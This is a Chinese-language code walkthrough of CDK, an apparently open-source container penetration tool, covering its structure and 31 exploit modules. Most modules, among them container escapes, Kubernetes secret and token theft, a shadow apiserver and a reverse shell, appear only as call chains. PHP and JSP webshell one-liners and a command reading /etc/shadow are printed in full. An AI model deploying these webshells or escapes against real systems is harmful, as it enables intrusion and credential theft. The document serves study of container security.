# CDK

- [1. 编译运行](#1-编译运行)
- [2. 目录结构](#2-目录结构)
- [3. 程序入口 main()](#3-程序入口-main)
- [4. cli](#4-cli)
- [5. evaluate](#5-evaluate)
  - [5.1. CallBasics()](#51-callbasics)
  - [5.2. CallAddedFunc()](#52-calladdedfunc)
    - [5.2.1. SearchLocalFilePath()](#521-searchlocalfilepath)
    - [5.2.2. ASLR()](#522-aslr)
    - [5.2.3. DumpCgroup()](#523-dumpcgroup)
- [6. exploit](#6-exploit)
  - [6.1. 参数解析](#61-参数解析)
  - [6.2. 执行逻辑](#62-执行逻辑)
  - [6.3. cdk run --list 查看exp列表 (total 32)](#63-cdk-run---list-查看exp列表-total-32)
  - [6.4. cdk run poc1 args1](#64-cdk-run-poc1-args1)
    - [6.4.1. abuse-unpriv-userns](#641-abuse-unpriv-userns)
    - [6.4.2. ak-leakage](#642-ak-leakage)
    - [6.4.3. cap-dac-read-search](#643-cap-dac-read-search)
    - [6.4.4. check-ptrace](#644-check-ptrace)
    - [6.4.5. docker-api-pwn](#645-docker-api-pwn)
    - [6.4.6. docker-sock-check](#646-docker-sock-check)
    - [6.4.7. docker-sock-pwn](#647-docker-sock-pwn)
    - [6.4.8. etcd-get-k8s-token](#648-etcd-get-k8s-token)
    - [6.4.9. istio-Check](#649-istio-check)
    - [6.4.10. k8s-backdoor-daemonset](#6410-k8s-backdoor-daemonset)
    - [6.4.11. k8s-configmap-dump](#6411-k8s-configmap-dump)
    - [6.4.12. k8s-cronjob](#6412-k8s-cronjob)
    - [6.4.13. k8s-get-sa-token](#6413-k8s-get-sa-token)
    - [6.4.14. k8s-kubelet-var-log-escape](#6414-k8s-kubelet-var-log-escape)
    - [6.4.15. k8s-mitm-clusterip](#6415-k8s-mitm-clusterip)
    - [6.4.16. k8s-psp-dump](#6416-k8s-psp-dump)
    - [6.4.17. k8s-secret-dump](#6417-k8s-secret-dump)
    - [6.4.18. k8s-shadow-apiserver](#6418-k8s-shadow-apiserver)
    - [6.4.19. kubelet-exec](#6419-kubelet-exec)
    - [6.4.20. lxcfs-rw](#6420-lxcfs-rw)
    - [6.4.21. lxcfs-rw-cgroup](#6421-lxcfs-rw-cgroup)
    - [6.4.22. mount-cgroup](#6422-mount-cgroup)
    - [6.4.23. mount-disk](#6423-mount-disk)
    - [6.4.24. mount-procfs](#6424-mount-procfs)
    - [6.4.25. registry-brute](#6425-registry-brute)
    - [6.4.26. reverse-shell](#6426-reverse-shell)
    - [6.4.27. rewrite-cgroup-devices](#6427-rewrite-cgroup-devices)
    - [6.4.28. runc-pwn](#6428-runc-pwn)
    - [6.4.29. service-probe](#6429-service-probe)
    - [6.4.30. shim-pwn](#6430-shim-pwn)
    - [6.4.31. webshell-deploy](#6431-webshell-deploy)
- [7. tool 部分](#7-tool-部分)
- [8. 参考资料](#8-参考资料)

## 1. 编译运行

```bash

gitclonehttps://github.com/cdk-team/CDK/

cdCDK

gobuildcmd/cdk/cdk.go

```

## 2. 目录结构

```bash

├──cmd

│   └──cdk  //入口函数

├──conf

├──go.mod

├──go.sum

├──LICENSE

├──pkg

│   ├──cli  //命令行参数解析

│   ├──errors  //自定义CDKRuntimeError

│   ├──evaluate//本地信息收集

│   ├──exploit  //exp

│   ├──plugin  //插件管理接口

│   ├──task   //自动逃逸代码

│   ├──tool  //工具集ncviifconfigpscurl端口扫描等

│   └──util  //一些功能函数

├──README.md

├──test

│   ├──CDK-deploy-test

│   ├──k8s_exploit_util

│   ├──scan_file_path

│   └──scan_file_text

└──thanks.md

```

一共大约 8000 行代码，需要重点关注启动 pkg 下面的 6000 行代码。

```bash

     134textfiles.

     132uniquefiles.

      15filesignored.


github.com/AlDanial/clocv1.74  T=0.29s (416.0 files/s,40163.5lines/s)

-------------------------------------------------------------------------------

Language                     files          blank        comment           code

-------------------------------------------------------------------------------

Go                              95           1614           1923           6396

Python                           6            127            102            859

Markdown                         5            110              0            274

YAML                            11             24              8            253

BourneShell                     1             20              6             41

JSON                             4              0              0             23

-------------------------------------------------------------------------------

SUM:                           122           1895           2039           7846

-------------------------------------------------------------------------------

```

## 3. 程序入口 main()

```go

funcmain() {

    cli.ParseCDKMain()

}

```

## 4. cli

```text

cmd/cdk/cdk.go --> main() --> cli.ParseCDKMain()


docopt/docopt-go 命令行参数解析

```

## 5. evaluate

```go

    if ok.(bool) || fok.(bool) {

        fmt.Printf(BannerHeader)

        evaluate.CallBasics()

        if Args["--full"].(bool) {

            evaluate.CallAddedFunc()

        }

        returntrue

    }

```

### 5.1. CallBasics()

- BasicSysInfo()
  - os.Getwd()
  - os/user.Current()
  - os.Hostname()
  - gopsutil/v3/host.KernelVersion()
- FindSidFiles()
  - find /bin/. -perm -4000 -type f 查找具有 suid 权限的文件
- SearchSensitiveEnv()
  - 查找有用的环境变量
  - os.Environ()
  - regexp.MatchString(conf.SensitiveEnvRegex, env)
- SearchSensitiveService()
  - 查找有用的环境进程
  - gops.Processes()
  - regexp.MatchString(conf.SensitiveProcessRegex, proc.Executable())
- SearchAvailableCommands()
  - 检查命令是否存在
  - exec.LookPath(cmd)
- GetProcCapabilities()
  - 获取进程的 Capabilities 信息, 获取进程的权限
  - /proc/self/status
  - strings.HasPrefix(line, "Cap")
  - pattern.FindStringSubmatch(string(data))
- MountEscape()
  - 获取文件系统挂载信息
  - cat /proc/self/mountinfo
- CheckNetNamespace()
  - 匹配敏感的 unix 套接字
  - cat /proc/net/unix
- CheckRouteLocalNetworkValue()
  - 检查网络设备转发 lo 设备数据包的功能
  - cat /proc/sys/net/ipv4/conf/all/route_localnet
- CheckK8sAnonymousLogin()
  - 检查 api-server 是否允许匿名请求
  - kubectl.ServerAccountRequest
- CheckPrivilegedK8sServiceAccount(conf.K8sSATokenDefaultPath)
  - 检查服务账户是否可用 kubectl.ServerAccountRequest
  - 如果可用会尝试列出 namespaces kubectl.ServerAccountRequest
- CheckCloudMetadataAPI()
  - 请求 conf.CloudAPI 获取 Metadata API 信息
- DNSBasedServiceDiscovery()
  - net.LookupSRV
  - 基于 dns 进行服务发现 `https://github.com/kubernetes/dns/blob/master/docs/specification.md`

### 5.2. CallAddedFunc()

#### 5.2.1. SearchLocalFilePath()

遍历本地文件，查找是否有在 sensitiveFileRules.NameList 里的文件

SearchLocalFilePath() -> filepath.Walk() -> strings.Contains()

#### 5.2.2. ASLR()

检查栈随机化是否开启; `/proc/sys/kernel/randomize_va_space == 0`

#### 5.2.3. DumpCgroup()

获取进程(1 与 self)的 cgroup 信息 `/proc/1/cgroup``/proc/self/cgroup`

util.GetCgroup()

## 6. exploit

### 6.1. 参数解析

```go

    if Args["run"].(bool) {

        if Args["--list"].(bool) { // cdk run --list 查看所有的exp

            plugin.ListAllExploit()  // 列出所有的exp

            os.Exit(0)

        }

        name := Args["<exploit>"].(string)

        if plugin.Exploits[name] == nil {

            fmt.Printf("\nInvalid script name: %s , available scripts:\n", name)

            plugin.ListAllExploit()

            returntrue

        }

        plugin.RunSingleExploit(name) // 执行对应的exp

        returntrue

    }

```

### 6.2. 执行逻辑

- plugin下定义了Exploits的全局变量用来保存exp信息。
- exploit下的exp中的init()函数调用plugin.RegisterExploit("xxx", exploit)注册exp到Exploits中
- 以docker_runc.go为例
  - init()
  - dockerRuncPwnS 接口
    - Desc() 返回exp的说明
    - Run() 执行exp
  - dockerRuncPwn(hijackCommand string) 最终的漏洞检测函数

### 6.3. cdk run --list 查看exp列表 (total 32)

### 6.4. cdk run poc1 args1

#### 6.4.1. abuse-unpriv-userns

利用 CVE-2022-0492 进行自动化逃逸。

> [Exploit: abuse unpriv userns(opens new window)](https://github.com/cdk-team/CDK/wiki/Exploit:-abuse-unpriv-userns)

> [深入分析CVE-2022-0492漏洞(opens new window)](https://nosec.org/home/detail/4973.html)

#### 6.4.2. ak-leakage

- 查找本地泄漏的Ak/Secrets等敏感信息
- usage: cdk run ak-leakage `<dir>`
- Run() -> SearchLocalFileText(path) -> filepath.Walk() -> FindAllStringSubmatch

#### 6.4.3. cap-dac-read-search

- CAP_DAC_READ_SEARCH 能够绕过文件的读权限检查和目录的读和执行权限检查；
- RUN() -> CapDacReadSearchExploit(target, ref, chroot, cmd) -> execCommand(cmd)

-`docker run -it --rm --cap-add CAP_DAC_READ_SEARCH -v "$(pwd)/cdk":/cdk ubuntu /bin/bash``cdk run cap-dac-read-search /etc/shadow`

#### 6.4.4. check-ptrace

- 检查SYS_PTRACE标志位,同时打印容器内部进程列表
- 如果存在ptrace权限，容器同时挂载了主机的pid namespace 就可以逃逸
- RUN() -> CheckPidInject() -> ioutil.ReadFile("/proc/self/status") -> FindAllStringSubmatch() -> enableSysPtraceCap(mask) -> ps.RunPs()

#### 6.4.5. docker-api-pwn

- Docker API 2375未授权访问，控制宿主机的dockerd创建一个新容器，并挂在宿主机根目录/到容器内部/host，然后执行传入的命令
- Run() -> DockerRemoteAPIExploit(url, cmd) -> CheckDockerRemoteAPI(api) -> pull image -> create container -> get container id -> start container

#### 6.4.6. docker-sock-check

- 检查docker unix socket是否可用
- Run() -> CheckDockerSock(sock) -> os.Stat(path)->　util.UnixHttpSend("get", path, "http://127.0.0.1/info", "")

#### 6.4.7. docker-sock-pwn

- 检查docker.sock能否访问，如果能尝试启动alpine容器执行命令
- Run() -> DockerSockExploit(sock, cmd) -> CheckDockerSock(sock) -> DockerAPIPull(sock, "alpine:latest") -> DockerAPIRun(sock, cmd)

#### 6.4.8. etcd-get-k8s-token

- 通过etcd获取k8s的toekn

-> Run() -> etcdctl.DoRequest(opt) -> etcdctl.GetKeys -> etcdctl.GetKeys(resp1, opt.Silent) -> getPods(token, endpoint)

#### 6.4.9. istio-Check

- 检查当前的shell是否在istio(service mesh)中
- Run() -> http.Get("http://httpbin.org/get") -> strings.Contains(result.Header.XEnvoyPeerMetadataId, "sidecar")

#### 6.4.10. k8s-backdoor-daemonset

- 通过daemonset将用户指定的后门镜像部署到每个node。

#### 6.4.11. k8s-configmap-dump

- 拉取全部K8s Configmap信息保存到本地文件。

#### 6.4.12. k8s-cronjob

- 部署K8s CronJob定时创建用户指定的image并运行cmd。

#### 6.4.13. k8s-get-sa-token

- 绕过K8s RBAC
- 如果当前的Pod有创建Pod权限，提权到Cluster Admin
- 创建一个Pod并挂在目标service-account的token
- 在Pod中读取该token并发送到攻击者的公网服务器。

#### 6.4.14. k8s-kubelet-var-log-escape

- Exploit container escape with kubelet log access & /var/log mount

#### 6.4.15. k8s-mitm-clusterip

- K8s中间人攻击(CVE-2020-8554)
- 漏洞只影响部分CNI插件和网络模式
  - 部分CNI + Iptables 可劫持 POD network
  - 部分CNI + IPVS 可劫持 可劫持 NODE network
  - Global Router + IPVS 可劫持 可劫持 NODE network

#### 6.4.16. k8s-psp-dump

- 对于已经获取了kubeconfig或sa账号权限，进而想要创建特殊配置的容器，但是受到了K8s Pod Security Policies的限制时；
- 获取Pod Security Policies的规则信息。

#### 6.4.17. k8s-secret-dump

- 拉取全部K8s Secrets

#### 6.4.18. k8s-shadow-apiserver

- 部署一个shadow apiserver，该apiserver具有和集群中现存的apiserver一致的功能，同时开启了全部K8s管理权限，接受匿名请求且不保存审计日志。便于攻击者无痕迹的管理整个集群以及下发后续渗透行动。
- 需要master node的create pod权限
- 在攻入的pod内部查找API-server访问地址和凭据
- 连接apiserver判断权限
- 获取apiserver原有配置
- 修改配置
- 重新部署shadow apiserver

#### 6.4.19. kubelet-exec

- Attack the kubelet endpoint.Support anonymous access or token designation

#### 6.4.20. lxcfs-rw

- POD挂载了LXCFS目录包含CGOURP目录，并且对CGROUP有写权限

#### 6.4.21. lxcfs-rw-cgroup

- escape container by cgroup when root has LXCFS read & write privilege,

#### 6.4.22. mount-cgroup

- 逃逸与宿主机共享cgroup的容器
- 将宿主机cgroup目录挂载到容器内，随后劫持宿主机cgroup的release_agent文件，通过linux cgroup notify_on_release机制触发shellcode执行，完成逃逸。

#### 6.4.23. mount-disk

- 自动化逃逸有设备操作权限的容器
  - 识别当前容器内的挂载情况
  - 将宿主机的物理磁盘挂载到容器中
  - 编辑宿主机文件(如修改宿主机的/etc/crontab)完成逃逸。
- Run()
  - AllDiskMount()
  - disk.Partitions(false)
  - util.RemoveDuplicateElement(devices)
  - MountToRandomTarget(device)

#### 6.4.24. mount-procfs

- 逃逸挂载宿主机/proc目录的容器
  - 将用户指定的shell命令指向宿主机/sys/kernel/core_pattern文件，在容器空间通过segment fault触发core dump，进而触发shellcode执行。
- Run()
- ProcfsExploit(procDir, shellPayload)
- checkEnvFirst()
- GetDockerAbsPath()
- util.RandString(5)
- util.RewriteFile
- triggerSegmentFault()

#### 6.4.25. registry-brute

- 暴力破解registry
- Run() -> checkLogin() -> http.Client{}.Do()

#### 6.4.26. reverse-shell

- 执行一个反弹shell
- Run() -> ReverseShell() -> os/exec.Command().Run()

#### 6.4.27. rewrite-cgroup-devices

- sys_admin
- Run()
  - newDevicesCgroup()
    - mount -t cgroup -o devices devices /tmp/cdk_dcgroup**
  - findCurrentCgroupENV()
  - util.GetMountInfo()
  - util.SetBlockAccessible(devicesAllowPath)
  - util.FindTargetDeviceID(&mi)
    - util.MakeDev(mi.Major, mi.Minor)
    - syscall.Mknod("./cdk_mknod_result", syscall.S_IFBLK|uint32(os.FileMode(0700)), dev)

#### 6.4.28. runc-pwn

- CVE-2019-5736
  - 过特定的容器镜像或者exec操作可以获取到宿主机的runc执行时的文件句柄并修改掉runc的二进制文件，从而获取到宿主机的root执行权限
  - 影响版本 Docker版本 < 18.09.2 or runc版本 <= 1.0-rc6
- Run() - dockerRuncPwn(cmd)

#### 6.4.29. service-probe

- 端口扫描
- Run()
- probe.TCPScanExploitAPI(args[0])
  - net.DialTimeout("tcp", target, timeout)

#### 6.4.30. shim-pwn

- 自动化逃逸CVE-2020-15257，反弹宿主机的shell到远端服务器。
- Run()
- ContainerdPwn()
  - ContainerdPwn(shellCmd, "", "")
  - ContainerdPwn(shellCmd, "", "")
- getShimSockets()
- containerdShimApiExp()

#### 6.4.31. webshell-deploy

- 生成接受随机POST参数的PHP或JSP webshell写入指定文件。
  - var WebShellCodeJSP = "<%Runtime.getRuntime().exec(request.getParameter("$SECRET_PARAM"));%>"
  - var WebShellCodePHP = "`<?php @eval($_POST['$SECRET_PARAM']);?>`"
- Run() -> deployWebShell(fileType,path) -> param = "cdk_" + util.RandString(7)

## 7. tool 部分

- dockerd_api
  - ucurl
  - dcurl
  - net.http
- etcdctl
  - ectl http.NewRequest
- kubectl
  - kcurl http.NewRequest
- netcat
  - net.ListenPacket
  - net.Dial
  - io.Copy
- network
  - ifcofnig net.Interfaces()
- probe
  - tcp connet 端口扫描 net.DialTimeout
- ps
  - github.com/shirou/gopsutil 获取系统信息的一个包，类似 python 的 psutil
- vi
  -`https://github.com/bkthomps/Ven` 一个 go 写类似 vim 的文本编辑器

## 8. 参考资料

> [CDK：一款针对容器场景的渗透工具](https://www.freebuf.com/sectool/261432.html)
>
